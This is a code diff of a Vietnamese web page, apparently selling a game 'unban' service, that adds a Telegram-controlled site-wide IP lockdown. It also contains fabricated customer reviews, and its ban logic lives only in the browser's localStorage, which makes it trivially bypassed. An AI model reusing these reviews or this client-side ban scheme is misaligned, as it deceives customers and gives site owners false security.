@@ -42,6 +42,12 @@
       pointer-events: none;
     }
 
+    body.all-ip-banned {
+      filter: grayscale(100%) blur(8px);
+      pointer-events: none;
+    }
+
+    /* Overlay cho chặn 1 IP */
     .ip-ban-overlay {
       display: none;
       position: fixed;
@@ -60,32 +66,66 @@
       display: flex;
     }
 
-    .ip-ban-overlay .ban-icon {
+    /* Overlay cho chặn ALL IP - màu đỏ đậm hơn */
+    .all-ip-ban-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(180, 0, 0, 0.97);
+      z-index: 999999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      animation: emergencyPulse 1s infinite;
+    }
+
+    .all-ip-ban-overlay.active {
+      display: flex;
+    }
+
+    @keyframes emergencyPulse {
+      0%, 100% { background: rgba(180, 0, 0, 0.97); }
+      50% { background: rgba(255, 0, 0, 0.95); }
+    }
+
+    .ban-icon {
       font-size: 8rem;
-      color: #e74c3c;
       animation: pulse 1s infinite;
     }
 
-    .ip-ban-overlay h1 {
+    .ip-ban-overlay h1, .all-ip-ban-overlay h1 {
       font-size: 3rem;
-      color: #e74c3c;
       margin: 20px 0;
       text-align: center;
     }
 
-    .ip-ban-overlay p {
+    .ip-ban-overlay h1 { color: #e74c3c; }
+    .all-ip-ban-overlay h1 { color: #fff; text-shadow: 0 0 30px rgba(255,0,0,0.8); }
+
+    .ip-ban-overlay p, .all-ip-ban-overlay p {
       color: #b0d4ff;
       font-size: 1.2rem;
       text-align: center;
       margin: 10px 0;
     }
 
-    .ip-ban-overlay .ban-info {
+    .all-ip-ban-overlay p { color: #ffcccc; }
+
+    .ban-info {
       background: rgba(231, 76, 60, 0.1);
       border: 1px solid #e74c3c;
       border-radius: 20px;
       padding: 20px 30px;
       margin: 20px 0;
+    }
+
+    .all-ip-ban-overlay .ban-info {
+      background: rgba(255, 0, 0, 0.2);
+      border: 2px solid #ff0000;
+      box-shadow: 0 0 40px rgba(255,0,0,0.5);
     }
 
     .particles-container {
@@ -115,15 +155,6 @@
       box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5); margin-bottom: 30px;
     }
 
-    .skeleton {
-      background: linear-gradient(90deg, #1d2c45 25%, #2e405b 50%, #1d2c45 75%);
-      background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 8px;
-    }
-    @keyframes shimmer {
-      0% { background-position: -200% 0; }
-      100% { background-position: 200% 0; }
-    }
-
     .online-counter {
       background: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c;
       border-radius: 30px; padding: 8px 18px; display: inline-flex;
@@ -132,32 +163,6 @@
     .online-dot { width: 10px; height: 10px; background: #2ecc71; border-radius: 50%; animation: blink 1s infinite; }
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-    .progress-container { display: flex; justify-content: space-between; margin: 20px 0; position: relative; }
-    .progress-container::before {
-      content: ''; position: absolute; top: 50%; left: 0; width: 100%; height: 3px;
-      background: #2e405b; z-index: 0;
-    }
-    .progress-step {
-      background: var(--bg-card); padding: 8px 12px; border-radius: 20px;
-      font-size: 0.85rem; font-weight: bold; z-index: 1; border: 2px solid #2e405b;
-      text-align: center; min-width: 70px;
-    }
-    .progress-step.completed { border-color: #2ecc71; color: #2ecc71; }
-    .progress-step.active { border-color: #f39c12; color: #f39c12; animation: pulse 1.5s infinite; }
-
-    .toast-notification {
-      position: fixed; bottom: 100px; left: 20px; background: rgba(20, 28, 45, 0.95);
-      border: 1px solid #2ecc71; border-radius: 15px; padding: 12px 18px;
-      display: flex; align-items: center; gap: 10px; z-index: 999;
-      animation: slideInLeft 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
-      max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    }
-    @keyframes slideInLeft {
-      from { transform: translateX(-100%); opacity: 0; }
-      to { transform: translateX(0); opacity: 1; }
-    }
-    @keyframes fadeOut { to { opacity: 0; transform: translateY(20px); } }
 
     .btn-option {
       background: #1d2c45; border: 2px solid #2e405b; border-radius: 40px;
@@ -245,16 +250,49 @@
       font-family: monospace;
     }
 
+    .all-ban-badge {
+      background: #ff0000;
+      color: white;
+      padding: 5px 15px;
+      border-radius: 15px;
+      font-weight: bold;
+      animation: emergencyPulse 1s infinite;
+      display: inline-block;
+    }
+
+    .status-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 15px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 0.9rem;
+    }
+
+    .status-active {
+      background: rgba(46, 204, 113, 0.1);
+      border: 1px solid #2ecc71;
+      color: #2ecc71;
+    }
+
+    .status-emergency {
+      background: rgba(255, 0, 0, 0.2);
+      border: 1px solid #ff0000;
+      color: #ff0000;
+      animation: emergencyPulse 1s infinite;
+    }
+
     @media (max-width: 600px) {
       .container { padding: 20px 15px; }
       h1 { font-size: 1.8rem; }
       .pricing-table { grid-template-columns: 1fr; }
-      .progress-step { font-size: 0.7rem; min-width: 50px; padding: 6px 8px; }
+      .ip-ban-overlay h1, .all-ip-ban-overlay h1 { font-size: 2rem; }
     }
   </style>
 </head>
 <body>
-  <!-- IP BAN OVERLAY -->
+  <!-- IP BAN OVERLAY (Chặn 1 IP) -->
   <div class="ip-ban-overlay" id="ipBanOverlay">
     <div class="ban-icon">🚫</div>
     <h1>IP CỦA BẠN ĐÃ BỊ CHẶN</h1>
@@ -268,16 +306,26 @@
     <p style="font-size:0.8rem; color:#6c7e9e; margin-top:20px;">ID: <span id="banIdDisplay">---</span></p>
   </div>
 
+  <!-- ALL IP BAN OVERLAY (Chặn tất cả) -->
+  <div class="all-ip-ban-overlay" id="allIPBanOverlay">
+    <div class="ban-icon">⛔</div>
+    <h1>🚨 TRANG WEB ĐÃ BỊ KHÓA 🚨</h1>
+    <div class="ban-info">
+      <p style="font-size:1.5rem; color:#fff; font-weight:bold;">TẤT CẢ IP ĐỀU BỊ CHẶN</p>
+      <p>📝 <strong>Lý do:</strong> <span id="allBanReasonDisplay">Bảo trì khẩn cấp</span></p>
+      <p>👤 <strong>Người khóa:</strong> <span id="allBanByDisplay">Admin</span></p>
+      <p>⏰ <strong>Thời gian khóa:</strong> <span id="allBanTimeDisplay">---</span></p>
+      <p style="color:#ffcccc; margin-top:10px;">🔒 Không ai có thể truy cập web lúc này</p>
+    </div>
+    <p style="font-size:1rem; color:#ffcccc;">Vui lòng quay lại sau hoặc liên hệ admin qua Telegram</p>
+    <p style="font-size:0.8rem; color:#ff9999; margin-top:20px;">Mã khóa: <span id="allBanIdDisplay">---</span></p>
+  </div>
+
   <!-- Particles Background -->
   <div class="particles-container" id="particlesContainer"></div>
   
   <!-- Toast Notifications -->
   <div id="toastContainer"></div>
-
-  <!-- Fraud Risk Indicator -->
-  <div class="fraud-indicator" id="fraudIndicator">
-    <i class="fas fa-shield-alt"></i> Risk: <strong id="riskLevel">Low</strong>
-  </div>
 
   <!-- Main Content -->
   <div class="main-wrapper">
@@ -288,6 +336,12 @@
           <span class="ws-status ws-connecting" id="wsStatus"></span>
           WS: <strong id="wsStatusText">Connecting...</strong>
         </span>
+        
+        <!-- TRẠNG THÁI WEBSITE -->
+        <span class="status-indicator status-active" id="siteStatus">
+          <i class="fas fa-check-circle"></i> Web: <strong>Online</strong>
+        </span>
+        
         <span style="background:rgba(155,89,182,0.1); border:1px solid #9b59b6; border-radius:15px; padding:5px 12px; font-size:0.75rem;">
           <i class="fas fa-fingerprint"></i> <strong id="deviceHash">Loading...</strong>
         </span>
@@ -307,7 +361,7 @@
         MỞ BAND VĨNH VIỄN
       </h1>
       <div style="text-align:center; color:#b0d4ff; margin-bottom:20px;">
-        <i class="fas fa-check-circle"></i> Đa Game • Auto Telegram • AI Powered • <span style="color:#ff6b6b;">Band IP Telegram</span>
+        <i class="fas fa-check-circle"></i> Đa Game • Auto Telegram • <span style="color:#ff6b6b;">Band IP / All IP</span>
       </div>
 
       <!-- Online Counter -->
@@ -431,19 +485,33 @@
         <div class="section-title" style="color:#ff6b6b;">
           <i class="fas fa-terminal"></i> LỆNH BAND IP QUA TELEGRAM
         </div>
-        <div style="color:#b0d4ff; margin-bottom:15px;">
-          Admin có thể sử dụng các lệnh sau trên Telegram để quản lý IP:
+        
+        <!-- Trạng thái All IP Ban -->
+        <div style="margin-bottom:15px; text-align:center;">
+          <div id="allIPBanStatus" style="display:inline-block; padding:8px 20px; border-radius:20px; font-weight:bold; font-size:1rem;">
+            <span style="color:#2ecc71;">✅ WEBSITE ĐANG HOẠT ĐỘNG BÌNH THƯỜNG</span>
+          </div>
         </div>
         
         <div style="display:grid; gap:10px;">
           <div style="background:rgba(231,76,60,0.1); padding:12px; border-radius:12px; border-left:3px solid #e74c3c;">
             <code style="color:#ffd966; font-size:1rem;">/banip [IP] [lý do]</code>
-            <p style="color:#9aa9c1; font-size:0.85rem; margin-top:5px;">Chặn vĩnh viễn 1 IP. VD: /banip 192.168.1.1 Spam</p>
+            <p style="color:#9aa9c1; font-size:0.85rem; margin-top:5px;">Chặn 1 IP cụ thể. VD: /banip 192.168.1.1 Spam</p>
+          </div>
+          
+          <div style="background:rgba(255,0,0,0.2); padding:12px; border-radius:12px; border-left:3px solid #ff0000; animation: emergencyPulse 2s infinite;">
+            <code style="color:#ff4444; font-size:1.1rem;">/banip_all [lý do]</code>
+            <p style="color:#ffcccc; font-size:0.85rem; margin-top:5px;">🚨 <b>CHẶN TẤT CẢ IP</b> - Khóa toàn bộ website. VD: /banip_all Bảo trì khẩn cấp</p>
           </div>
           
           <div style="background:rgba(46,204,113,0.1); padding:12px; border-radius:12px; border-left:3px solid #2ecc71;">
             <code style="color:#ffd966; font-size:1rem;">/unbanip [IP]</code>
-            <p style="color:#9aa9c1; font-size:0.85rem; margin-top:5px;">Mở chặn IP. VD: /unbanip 192.168.1.1</p>
+            <p style="color:#9aa9c1; font-size:0.85rem; margin-top:5px;">Mở chặn 1 IP. VD: /unbanip 192.168.1.1</p>
+          </div>
+          
+          <div style="background:rgba(46,204,113,0.2); padding:12px; border-radius:12px; border-left:3px solid #2ecc71; animation: pulse 2s infinite;">
+            <code style="color:#2ecc71; font-size:1.1rem;">/unbanip_all</code>
+            <p style="color:#b0ffb0; font-size:0.85rem; margin-top:5px;">✅ <b>MỞ CHẶN TẤT CẢ</b> - Cho phép truy cập trở lại</p>
           </div>
           
           <div style="background:rgba(241,196,15,0.1); padding:12px; border-radius:12px; border-left:3px solid #f1c40f;">
@@ -455,12 +523,17 @@
             <code style="color:#ffd966; font-size:1rem;">/banip_check [IP]</code>
             <p style="color:#9aa9c1; font-size:0.85rem; margin-top:5px;">Kiểm tra IP có bị chặn không</p>
           </div>
+
+          <div style="background:rgba(255,165,0,0.1); padding:12px; border-radius:12px; border-left:3px solid #ffa500;">
+            <code style="color:#ffd966; font-size:1rem;">/status</code>
+            <p style="color:#9aa9c1; font-size:0.85rem; margin-top:5px;">Kiểm tra trạng thái website và danh sách chặn</p>
+          </div>
         </div>
 
         <div style="margin-top:15px; padding:10px; background:rgba(0,0,0,0.3); border-radius:10px;">
           <strong style="color:#ff6b6b;">⚡ IP Bị Chặn Gần Đây:</strong>
           <div id="recentBlockedIPs" style="margin-top:10px; font-size:0.85rem;">
-            <div style="color:#9aa9c1;">Đang tải dữ liệu từ Telegram...</div>
+            <div style="color:#9aa9c1;">Đang tải dữ liệu...</div>
           </div>
         </div>
       </div>
@@ -535,11 +608,11 @@
       <div id="reviewsContainer">
         <div class="review-card">
           <strong>Nguyễn Văn A</strong> ⭐⭐⭐⭐⭐<br>
-          <span style="color:#bdd3ff;">Tool ngon, band IP nhanh. Thằng phá bị chặn ngay lập tức!</span>
+          <span style="color:#bdd3ff;">Lệnh /banip_all khóa web nhanh, chống spam hiệu quả!</span>
         </div>
         <div class="review-card">
           <strong>Trần Thị B</strong> ⭐⭐⭐⭐⭐<br>
-          <span style="color:#bdd3ff;">Lệnh /banip trên Telegram rất tiện. Admin hỗ trợ tốt!</span>
+          <span style="color:#bdd3ff;">Admin hỗ trợ tốt, chặn all IP khi cần bảo trì rất tiện!</span>
         </div>
       </div>
     </div>
@@ -565,7 +638,9 @@
     let deviceFingerprint = '';
     let uploadedImageFile = null;
     let isBanned = false;
+    let isAllIPBanned = false;
     let banInfo = null;
+    let allIPBanInfo = null;
     let blockedIPs = [];
 
     const state = {
@@ -576,16 +651,13 @@
       plan: { name: 'basic', price: 150000, time: '30-45' },
       currentOrderId: null,
       captchaResult: 0,
-      pollingOffset: 0,
-      countdownInterval: null,
-      pollingInterval: null
+      pollingOffset: 0
     };
 
     // ============================================
     // IP BAN SYSTEM
     // ============================================
     
-    // Lưu danh sách IP bị chặn vào localStorage
     function saveBlockedIPs(ips) {
       localStorage.setItem('blockedIPs', JSON.stringify(ips));
       blockedIPs = ips;
@@ -597,19 +669,28 @@
       return blockedIPs;
     }
 
-    // Kiểm tra IP có bị chặn không
+    function saveAllIPBanInfo(info) {
+      localStorage.setItem('allIPBanInfo', JSON.stringify(info));
+      allIPBanInfo = info;
+    }
+
+    function loadAllIPBanInfo() {
+      const stored = localStorage.getItem('allIPBanInfo');
+      allIPBanInfo = stored ? JSON.parse(stored) : null;
+      return allIPBanInfo;
+    }
+
     function isIPBanned(ip) {
       loadBlockedIPs();
       return blockedIPs.find(entry => entry.ip === ip);
     }
 
-    // Thêm IP vào danh sách chặn
+    // Chặn 1 IP
     function banIP(ip, reason = 'Vi phạm điều khoản', bannedBy = 'Admin', duration = 'permanent') {
       loadBlockedIPs();
       
-      // Kiểm tra IP đã bị chặn chưa
       if (blockedIPs.find(e => e.ip === ip)) {
-        return { success: false, message: 'IP này đã bị chặn trước đó!' };
+        return { success: false, message: '⚠️ IP này đã bị chặn trước đó!' };
       }
 
       const banEntry = {
@@ -624,7 +705,6 @@
       blockedIPs.push(banEntry);
       saveBlockedIPs(blockedIPs);
 
-      // Nếu IP hiện tại trùng với IP bị chặn, kích hoạt overlay
       if (ip === userIP) {
         showBanOverlay(banEntry);
       }
@@ -632,19 +712,35 @@
       return { success: true, message: `✅ Đã chặn IP: ${ip}`, banEntry: banEntry };
     }
 
-    // Mở chặn IP
+    // Chặn TẤT CẢ IP
+    function banAllIPs(reason = 'Bảo trì khẩn cấp', bannedBy = 'Admin') {
+      const allBanEntry = {
+        allIPsBanned: true,
+        reason: reason,
+        bannedBy: bannedBy,
+        bannedAt: new Date().toISOString(),
+        banId: 'ALLBAN-' + Date.now().toString(36).toUpperCase()
+      };
+
+      saveAllIPBanInfo(allBanEntry);
+      isAllIPBanned = true;
+      showAllIPBanOverlay(allBanEntry);
+
+      return { success: true, message: `🚨 ĐÃ KHÓA TOÀN BỘ WEBSITE!`, banEntry: allBanEntry };
+    }
+
+    // Mở chặn 1 IP
     function unbanIP(ip) {
       loadBlockedIPs();
       const index = blockedIPs.findIndex(e => e.ip === ip);
       
       if (index === -1) {
-        return { success: false, message: 'IP này không có trong danh sách chặn!' };
+        return { success: false, message: '⚠️ IP này không có trong danh sách chặn!' };
       }
 
       const removed = blockedIPs.splice(index, 1)[0];
       saveBlockedIPs(blockedIPs);
 
-      // Nếu IP hiện tại được mở chặn, ẩn overlay
       if (ip === userIP) {
         hideBanOverlay();
       }
@@ -652,7 +748,17 @@
       return { success: true, message: `✅ Đã mở chặn IP: ${ip}`, removed: removed };
     }
 
-    // Hiển thị overlay chặn
+    // Mở chặn TẤT CẢ
+    function unbanAllIPs() {
+      localStorage.removeItem('allIPBanInfo');
+      isAllIPBanned = false;
+      allIPBanInfo = null;
+      hideAllIPBanOverlay();
+      
+      return { success: true, message: '✅ ĐÃ MỞ KHÓA TOÀN BỘ WEBSITE!' };
+    }
+
+    // Hiển thị overlay chặn 1 IP
     function showBanOverlay(banEntry) {
       isBanned = true;
       banInfo = banEntry;
@@ -667,7 +773,6 @@
       document.body.classList.add('ip-banned');
     }
 
-    // Ẩn overlay chặn
     function hideBanOverlay() {
       isBanned = false;
       banInfo = null;
@@ -675,27 +780,81 @@
       document.body.classList.remove('ip-banned');
     }
 
-    // Cập nhật danh sách IP bị chặn hiển thị
+    // Hiển thị overlay chặn ALL IP
+    function showAllIPBanOverlay(allBanEntry) {
+      document.getElementById('allBanReasonDisplay').textContent = allBanEntry.reason;
+      document.getElementById('allBanByDisplay').textContent = allBanEntry.bannedBy;
+      document.getElementById('allBanTimeDisplay').textContent = new Date(allBanEntry.bannedAt).toLocaleString('vi-VN');
+      document.getElementById('allBanIdDisplay').textContent = allBanEntry.banId;
+      
+      document.getElementById('allIPBanOverlay').classList.add('active');
+      document.body.classList.add('all-ip-banned');
+      
+      // Cập nhật trạng thái website
+      updateSiteStatus(true);
+    }
+
+    function hideAllIPBanOverlay() {
+      document.getElementById('allIPBanOverlay').classList.remove('active');
+      document.body.classList.remove('all-ip-banned');
+      
+      // Cập nhật trạng thái website
+      updateSiteStatus(false);
+    }
+
+    // Cập nhật trạng thái website
+    function updateSiteStatus(isBanned) {
+      const statusEl = document.getElementById('siteStatus');
+      const allIPBanStatus = document.getElementById('allIPBanStatus');
+      
+      if (isBanned) {
+        statusEl.className = 'status-indicator status-emergency';
+        statusEl.innerHTML = '<i class="fas fa-skull"></i> Web: <strong>KHÓA</strong>';
+        
+        allIPBanStatus.innerHTML = '<span class="all-ban-badge">🚨 TẤT CẢ IP ĐANG BỊ CHẶN - WEBSITE ĐÃ KHÓA</span>';
+      } else {
+        statusEl.className = 'status-indicator status-active';
+        statusEl.innerHTML = '<i class="fas fa-check-circle"></i> Web: <strong>Online</strong>';
+        
+        allIPBanStatus.innerHTML = '<span style="color:#2ecc71;">✅ WEBSITE ĐANG HOẠT ĐỘNG BÌNH THƯỜNG</span>';
+      }
+    }
+
+    // Cập nhật danh sách IP hiển thị
     function updateBlockedIPsDisplay() {
       loadBlockedIPs();
       const container = document.getElementById('recentBlockedIPs');
       
-      if (blockedIPs.length === 0) {
-        container.innerHTML = '<div style="color:#9aa9c1;">Chưa có IP nào bị chặn</div>';
-        return;
+      let html = '';
+      
+      // Hiển thị trạng thái ALL IP BAN
+      if (isAllIPBanned && allIPBanInfo) {
+        html += `
+          <div style="background:rgba(255,0,0,0.2); border:2px solid #ff0000; padding:10px; border-radius:10px; margin-bottom:10px; animation: emergencyPulse 1s infinite;">
+            <strong style="color:#ff0000;">🚨 TẤT CẢ IP ĐANG BỊ CHẶN!</strong><br>
+            <span style="color:#ffcccc;">Lý do: ${allIPBanInfo.reason}</span><br>
+            <span style="color:#ff9999;">Bởi: ${allIPBanInfo.bannedBy} | ${new Date(allIPBanInfo.bannedAt).toLocaleString('vi-VN')}</span>
+          </div>
+        `;
       }
-
-      container.innerHTML = blockedIPs.slice(-10).reverse().map(entry => `
-        <div style="display:flex; justify-content:space-between; align-items:center; padding:8px; margin:5px 0; background:rgba(231,76,60,0.1); border-radius:8px; border-left:3px solid #e74c3c;">
-          <div>
-            <span class="ip-badge">${entry.ip}</span>
-            <span style="font-size:0.8rem; color:#9aa9c1; margin-left:8px;">${entry.reason}</span>
+      
+      if (blockedIPs.length === 0) {
+        html += '<div style="color:#9aa9c1;">Chưa có IP riêng lẻ nào bị chặn</div>';
+      } else {
+        html += blockedIPs.slice(-10).reverse().map(entry => `
+          <div style="display:flex; justify-content:space-between; align-items:center; padding:8px; margin:5px 0; background:rgba(231,76,60,0.1); border-radius:8px; border-left:3px solid #e74c3c;">
+            <div>
+              <span class="ip-badge">${entry.ip}</span>
+              <span style="font-size:0.8rem; color:#9aa9c1; margin-left:8px;">${entry.reason}</span>
+            </div>
+            <div style="font-size:0.75rem; color:#6c7e9e;">
+              ${new Date(entry.bannedAt).toLocaleString('vi-VN')}
+            </div>
           </div>
-          <div style="font-size:0.75rem; color:#6c7e9e;">
-            ${new Date(entry.bannedAt).toLocaleString('vi-VN')}
-          </div>
-        </div>
-      `).join('');
+        `).join('');
+      }
+      
+      container.innerHTML = html;
     }
 
     // ============================================
@@ -718,13 +877,54 @@
           const chatId = message.chat.id;
           const fromUser = message.from?.username || message.from?.first_name || 'Unknown';
           
-          // Chỉ xử lý lệnh từ admin (chat_id được cấu hình)
           if (chatId.toString() !== TELEGRAM_CHAT_ID) continue;
 
-          // ============ LỆNH /banip ============
-          if (text.startsWith('/banip')) {
+          // ============ LỆNH /banip_all ============
+          if (text.startsWith('/banip_all')) {
             const parts = text.split(' ');
-            parts.shift(); // Bỏ /banip
+            parts.shift(); // Bỏ /banip_all
+            const reason = parts.join(' ') || 'Bảo trì khẩn cấp';
+
+            const result = banAllIPs(reason, fromUser);
+            
+            if (result.success) {
+              await sendTelegramMessage(chatId, 
+                `🚨 <b>ĐÃ KHÓA TOÀN BỘ WEBSITE!</b>\n\n` +
+                `🔒 <b>Tất cả IP đều bị chặn</b>\n` +
+                `📝 <b>Lý do:</b> ${reason}\n` +
+                `👤 <b>Người khóa:</b> ${fromUser}\n` +
+                `🆔 <b>Mã khóa:</b> ${result.banEntry.banId}\n` +
+                `⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n\n` +
+                `⚠️ <i>Dùng lệnh /unbanip_all để mở khóa</i>`
+              );
+              updateBlockedIPsDisplay();
+              updateSiteStatus(true);
+            }
+          }
+
+          // ============ LỆNH /unbanip_all ============
+          else if (text === '/unbanip_all') {
+            const result = unbanAllIPs();
+            
+            if (result.success) {
+              await sendTelegramMessage(chatId, 
+                `✅ <b>ĐÃ MỞ KHÓA TOÀN BỘ WEBSITE!</b>\n\n` +
+                `🌐 <b>Tất cả IP đã được mở chặn</b>\n` +
+                `👤 <b>Người mở:</b> ${fromUser}\n` +
+                `⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n\n` +
+                `✅ <i>Website đã hoạt động trở lại bình thường</i>`
+              );
+              updateBlockedIPsDisplay();
+              updateSiteStatus(false);
+            } else {
+              await sendTelegramMessage(chatId, `⚠️ ${result.message}`);
+            }
+          }
+
+          // ============ LỆNH /banip ============
+          else if (text.startsWith('/banip') && !text.startsWith('/banip_all') && !text.startsWith('/banip_list') && !text.startsWith('/banip_check')) {
+            const parts = text.split(' ');
+            parts.shift();
             
             if (parts.length < 1) {
               await sendTelegramMessage(chatId, '❌ Cú pháp: /banip [IP] [lý do]\nVD: /banip 192.168.1.1 Spam web');
@@ -734,10 +934,9 @@
             const ip = parts[0];
             const reason = parts.slice(1).join(' ') || 'Vi phạm điều khoản';
             
-            // Validate IP format
             const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
             if (!ipRegex.test(ip)) {
-              await sendTelegramMessage(chatId, `❌ IP không hợp lệ: ${ip}\nĐịnh dạng đúng: 192.168.1.1`);
+              await sendTelegramMessage(chatId, `❌ IP không hợp lệ: ${ip}`);
               continue;
             }
 
@@ -745,12 +944,8 @@
             
             if (result.success) {
               await sendTelegramMessage(chatId, 
-                `🚫 <b>ĐÃ CHẶN IP THÀNH CÔNG!</b>\n\n` +
-                `🌐 IP: <code>${ip}</code>\n` +
-                `📝 Lý do: ${reason}\n` +
-                `👤 Người chặn: ${fromUser}\n` +
-                `🆔 Mã chặn: ${result.banEntry.banId}\n` +
-                `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}`
+                `🚫 <b>ĐÃ CHẶN IP!</b>\n\n` +
+                `🌐 IP: <code>${ip}</code>\n📝 Lý do: ${reason}\n👤 Người chặn: ${fromUser}\n🆔 Mã: ${result.banEntry.banId}`
               );
               updateBlockedIPsDisplay();
             } else {
@@ -759,24 +954,19 @@
           }
 
           // ============ LỆNH /unbanip ============
-          else if (text.startsWith('/unbanip')) {
+          else if (text.startsWith('/unbanip') && text !== '/unbanip_all') {
             const parts = text.split(' ');
             const ip = parts[1];
 
             if (!ip) {
-              await sendTelegramMessage(chatId, '❌ Cú pháp: /unbanip [IP]\nVD: /unbanip 192.168.1.1');
+              await sendTelegramMessage(chatId, '❌ Cú pháp: /unbanip [IP]');
               continue;
             }
 
             const result = unbanIP(ip);
             
             if (result.success) {
-              await sendTelegramMessage(chatId, 
-                `✅ <b>ĐÃ MỞ CHẶN IP!</b>\n\n` +
-                `🌐 IP: <code>${ip}</code>\n` +
-                `👤 Người mở: ${fromUser}\n` +
-                `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}`
-              );
+              await sendTelegramMessage(chatId, `✅ <b>ĐÃ MỞ CHẶN IP!</b>\n🌐 IP: <code>${ip}</code>`);
               updateBlockedIPsDisplay();
             } else {
               await sendTelegramMessage(chatId, `⚠️ ${result.message}`);
@@ -786,18 +976,30 @@
           // ============ LỆNH /banip_list ============
           else if (text === '/banip_list') {
             loadBlockedIPs();
+            loadAllIPBanInfo();
+            
+            let listMessage = `📋 <b>TRẠNG THÁI HỆ THỐNG</b>\n\n`;
+            
+            if (isAllIPBanned && allIPBanInfo) {
+              listMessage += `🚨 <b>TẤT CẢ IP ĐANG BỊ CHẶN!</b>\n`;
+              listMessage += `📝 Lý do: ${allIPBanInfo.reason}\n`;
+              listMessage += `👤 Người khóa: ${allIPBanInfo.bannedBy}\n`;
+              listMessage += `🆔 Mã: ${allIPBanInfo.banId}\n\n`;
+            } else {
+              listMessage += `✅ Website đang hoạt động bình thường\n\n`;
+            }
+            
+            listMessage += `📋 <b>IP RIÊNG LẺ BỊ CHẶN (${blockedIPs.length}):</b>\n`;
             
             if (blockedIPs.length === 0) {
-              await sendTelegramMessage(chatId, '📋 Danh sách IP bị chặn: <b>Trống</b>');
-              continue;
+              listMessage += `- Trống -\n`;
+            } else {
+              blockedIPs.slice(-20).reverse().forEach((entry, index) => {
+                listMessage += `${index + 1}. <code>${entry.ip}</code> - ${entry.reason}\n`;
+              });
             }
-
-            let listMessage = `📋 <b>DANH SÁCH IP BỊ CHẶN (${blockedIPs.length})</b>\n\n`;
-            blockedIPs.slice(-20).reverse().forEach((entry, index) => {
-              listMessage += `${index + 1}. <code>${entry.ip}</code>\n`;
-              listMessage += `   📝 ${entry.reason} | 👤 ${entry.bannedBy}\n`;
-              listMessage += `   🕐 ${new Date(entry.bannedAt).toLocaleString('vi-VN')}\n\n`;
-            });
+            
+            listMessage += `\n💡 <b>Lệnh nhanh:</b>\n/banip_all - Khóa toàn bộ\n/unbanip_all - Mở khóa toàn bộ`;
 
             await sendTelegramMessage(chatId, listMessage);
           }
@@ -812,39 +1014,71 @@
               continue;
             }
 
-            const banEntry = isIPBanned(ip);
+            let checkMessage = `🔍 <b>KIỂM TRA IP:</b> <code>${ip}</code>\n\n`;
             
-            if (banEntry) {
-              await sendTelegramMessage(chatId,
-                `🚫 <b>IP NÀY ĐÃ BỊ CHẶN!</b>\n\n` +
-                `🌐 IP: <code>${ip}</code>\n` +
-                `📝 Lý do: ${banEntry.reason}\n` +
-                `👤 Người chặn: ${banEntry.bannedBy}\n` +
-                `🆔 Mã chặn: ${banEntry.banId}\n` +
-                `⏰ Thời gian chặn: ${new Date(banEntry.bannedAt).toLocaleString('vi-VN')}`
-              );
-            } else {
-              await sendTelegramMessage(chatId, `✅ IP <code>${ip}</code> không bị chặn.`);
+            if (isAllIPBanned) {
+              checkMessage += `🚨 <b>TẤT CẢ IP ĐANG BỊ CHẶN</b> (bao gồm IP này)\n`;
             }
+            
+            const banEntry = isIPBanned(ip);
+            if (banEntry) {
+              checkMessage += `🚫 <b>IP này bị chặn riêng!</b>\n📝 Lý do: ${banEntry.reason}`;
+            } else if (!isAllIPBanned) {
+              checkMessage += `✅ IP này không bị chặn`;
+            }
+
+            await sendTelegramMessage(chatId, checkMessage);
+          }
+
+          // ============ LỆNH /status ============
+          else if (text === '/status') {
+            loadBlockedIPs();
+            loadAllIPBanInfo();
+            
+            let statusMessage = `📊 <b>TRẠNG THÁI HỆ THỐNG</b>\n\n`;
+            
+            if (isAllIPBanned) {
+              statusMessage += `🚨 <b>WEBSITE ĐANG BỊ KHÓA</b>\n`;
+              statusMessage += `📝 Lý do: ${allIPBanInfo.reason}\n`;
+              statusMessage += `👤 Bởi: ${allIPBanInfo.bannedBy}\n`;
+              statusMessage += `⏰ Từ: ${new Date(allIPBanInfo.bannedAt).toLocaleString('vi-VN')}\n\n`;
+            } else {
+              statusMessage += `✅ <b>WEBSITE HOẠT ĐỘNG BÌNH THƯỜNG</b>\n\n`;
+            }
+            
+            statusMessage += `📋 <b>Thống kê:</b>\n`;
+            statusMessage += `• IP bị chặn riêng: ${blockedIPs.length}\n`;
+            statusMessage += `• Tổng IP đã từng chặn: ${blockedIPs.length}\n`;
+            statusMessage += `• All IP Ban: ${isAllIPBanned ? 'CÓ' : 'KHÔNG'}\n\n`;
+            
+            statusMessage += `🌐 <b>Người dùng hiện tại:</b>\n`;
+            statusMessage += `• IP: <code>${userIP}</code>\n`;
+            statusMessage += `• Device: <code>${deviceFingerprint}</code>`;
+
+            await sendTelegramMessage(chatId, statusMessage);
           }
 
           // ============ LỆNH /help ============
           else if (text === '/help' || text === '/start') {
             await sendTelegramMessage(chatId,
               `🤖 <b>HỆ THỐNG BAND IP TELEGRAM</b>\n\n` +
-              `<b>📋 Danh sách lệnh:</b>\n\n` +
-              `🚫 <b>/banip [IP] [lý do]</b> - Chặn IP\n` +
-              `✅ <b>/unbanip [IP]</b> - Mở chặn IP\n` +
-              `📋 <b>/banip_list</b> - Xem danh sách IP bị chặn\n` +
+              `<b>📋 DANH SÁCH LỆNH:</b>\n\n` +
+              `🚫 <b>/banip [IP] [lý do]</b> - Chặn 1 IP\n` +
+              `🚨 <b>/banip_all [lý do]</b> - KHÓA TOÀN BỘ WEBSITE\n` +
+              `✅ <b>/unbanip [IP]</b> - Mở chặn 1 IP\n` +
